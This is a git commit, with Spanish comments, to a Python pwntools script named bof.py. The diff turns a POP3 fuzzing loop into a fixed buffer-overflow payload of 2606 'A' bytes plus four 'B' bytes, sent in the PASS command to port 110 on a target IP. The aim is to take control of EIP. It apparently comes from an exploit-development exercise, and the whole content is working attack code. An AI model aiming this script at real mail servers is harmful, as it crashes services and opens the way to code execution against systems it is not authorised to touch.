cfd479b1290985e1044e1f0d2a83b479383987e6
liandd <juan6.garcia@ucp.edu.co>
2023-07-28 21:55:40 -0500

    Control en el EIP

--- bof.py
+++ bof.py
@@ -3,32 +3,29 @@
 from pwn import *
 import socket, sys
 
-if len(sys.argv) < 2:
-    print ("\n[!] Uso : python " + sys.argv[0] + " <ip-address>\n")
-    sys.exit(0)
-
-# Variables globales
-ip_address = sys.argv[1]
-rport = 110
+def exploit(ip_address, rport):
+    buffer = "A" * 2606 + "B" * 4
+    
+    p1 = log.progress("Data")
+    try:
+        p1.status("Enviando %s bytes" % len(buffer))
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((ip_address, rport))
+        s.recv(1024)
+        s.send(b'USER eva\r\n')
+        s.recv(1024)
+        s.send(b'PASS ' + buffer.encode('utf-8') + b'\r\n')
+        s.recv(1024)
+    except Exception as e:
+        print("\n[!] Ha habido un error de conexión:", e)
+        sys.exit(0)
 
 if __name__ == '__main__':
-    
-    buffer = ["A"]
-    contador = 100
-    while len(buffer) < 32:
-        buffer.append("A"*contador)
-        contador += 350
-    p1 = log.progress("Data")
-    for strings in buffer:
-        try:
-            p1.status("Enviando %s bytes" % len(strings))
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((ip_address, rport))
-            s.recv(1024)
-            s.send(b'USER eva\r\n')
-            s.recv(1024)
-            s.send(b'PASS ' + strings.encode('utf-8') + b'\r\n')
-            s.recv(1024)
-        except:
-            print("\n[!] Ha habido un error de conexion\n")
-            sys.exit(0)
+    if len(sys.argv) < 2:
+        print ("\n[!] Uso : python " + sys.argv[0] + " <ip-address>\n")
+        sys.exit(0)
+
+    ip_address = sys.argv[1]
+    rport = 110
+
+    exploit(ip_address, rport)
